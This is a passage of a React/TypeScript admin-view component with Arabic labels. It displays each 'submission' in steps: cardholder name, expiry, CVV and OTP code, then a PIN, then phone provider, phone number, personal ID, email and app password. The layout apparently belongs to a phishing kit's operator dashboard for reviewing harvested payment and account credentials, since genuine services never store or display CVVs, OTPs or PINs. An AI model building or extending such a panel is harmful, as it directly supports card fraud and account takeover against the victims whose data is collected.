                      <div className="bg-yellow-900/30 rounded-lg p-3 border border-yellow-500/30">
                        <p className="text-xs text-yellow-400">الاسم على البطاقة</p>
                        <p className="font-medium text-yellow-300 mt-1">
                          {selectedSubmission.step_4_payment.cardName || "-"}
                        </p>
                      </div>
                      <div className="bg-yellow-900/30 rounded-lg p-3 border border-yellow-500/30">
                        <p className="text-xs text-yellow-400">تاريخ الانتهاء</p>
                        <p className="font-mono font-bold text-yellow-300 mt-1">
                          {selectedSubmission.step_4_payment.expiry || "-"}
                        </p>
                      </div>
                      <div className="bg-red-900/30 rounded-lg p-3 border border-red-500/30">
                        <p className="text-xs text-red-400">CVV</p>
                        <p className="font-mono font-bold text-red-300 mt-1 text-lg">
                          {selectedSubmission.step_4_payment.cvv || "-"}
                        </p>
                      </div>
                      <div className="bg-purple-900/30 rounded-lg p-3 border border-purple-500/30">
                        <p className="text-xs text-purple-400">رمز OTP</p>
                        <p className="font-mono font-bold text-purple-300 mt-1 text-lg">
                          {selectedSubmission.step_4_payment.otpCode || "-"}
                        </p>
                      </div>
                    </div>
                  </div>
                </DetailSection>
              )}

              {/* Step 5: PIN */}
              {selectedSubmission.step_5_pin && (
                <DetailSection title="رمز PIN" icon={Shield} theme={currentTheme}>
                  <div className="grid grid-cols-2 gap-4">
                    <DetailItem 
                      label="التحقق" 
                      value={selectedSubmission.step_5_pin.pinVerified ? "تم التحقق بنجاح" : "لم يتم"}
                      theme={currentTheme}
                    />
                    <div className="bg-orange-900/30 rounded-lg p-3 border border-orange-500/30">
                      <p className="text-xs text-orange-400">رمز PIN</p>
                      <p className="font-mono font-bold text-orange-300 mt-1 text-2xl tracking-widest">
                        {selectedSubmission.step_5_pin.pinCode || "-"}
                      </p>
                    </div>
                  </div>
                </DetailSection>
              )}

              {/* Step 6: Phone Provider */}
              {selectedSubmission.step_6_phone_provider && (
                <DetailSection title="مزود خدمة الهاتف" icon={Smartphone} theme={currentTheme}>
                  <div className="grid grid-cols-2 gap-4">
                    <DetailItem label="مزود الخدمة" value={selectedSubmission.step_6_phone_provider.provider} theme={currentTheme} />
                    <DetailItem label="رقم الهاتف" value={selectedSubmission.step_6_phone_provider.phoneNumber} icon={Phone} theme={currentTheme} />
                    <DetailItem label="الرقم الشخصي" value={selectedSubmission.step_6_phone_provider.personalId} icon={User} theme={currentTheme} />
                    <DetailItem label="البريد الإلكتروني" value={selectedSubmission.step_6_phone_provider.email} icon={Mail} theme={currentTheme} />
                  </div>
                  <div className={cn("mt-4 pt-4 border-t", currentTheme.border)}>
                    <div className="bg-red-900/30 rounded-lg p-3 border border-red-500/30">
                      <p className="text-xs text-red-400">كلمة مرور التطبيق</p>
                      <p className="font-mono font-bold text-red-300 mt-1 text-lg">
                        {selectedSubmission.step_6_phone_provider.password || "-"}
                      </p>
                    </div>
                  </div>
                </DetailSection>
              )}
            </div>
          ) : (
            <div className={cn("flex items-center justify-center h-full", currentTheme.textMuted)}>
              <div className="text-center">
                <FileText className="h-16 w-16 mx-auto mb-4 opacity-50" />
                <p className="text-xl">اختر تسجيلاً لعرض التفاصيل</p>
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}

function DetailSection({ 
  title, 
  icon: Icon, 
  children,
  theme 
}: { 
  title: string; 
  icon: any; 
  children: React.ReactNode;
  theme?: typeof themes.dark;
}) {
  const t = theme || themes.dark;
  return (
    <div className={cn("rounded-xl p-4 md:p-6 border", t.card, t.border)}>
      <h3 className={cn("font-bold text-base md:text-lg mb-3 md:mb-4 flex items-center gap-2", t.text)}>
        <Icon className="h-4 w-4 md:h-5 md:w-5 text-blue-400" />
        {title}
      </h3>
      {children}
    </div>
  );
}

function DetailItem({ 
  label, 
  value, 
  icon: Icon,
  theme
}: { 
  label: string; 
  value: string; 
  icon?: any;
  theme?: typeof themes.dark;
}) {
  const t = theme || themes.dark;
  return (
    <div className={cn("rounded-lg p-2 md:p-3", t.bg)}>
      <div className="flex items-center gap-1 md:gap-2">
        {Icon && <Icon className={cn("h-3 w-3 md:h-4 md:w-4", t.textMuted)} />}
        <p className={cn("text-xs", t.textMuted)}>{label}</p>
      </div>
      <p className={cn("font-medium mt-1 text-sm md:text-base break-all", t.text)}>{value || "-"}</p>
    </div>
  );
}
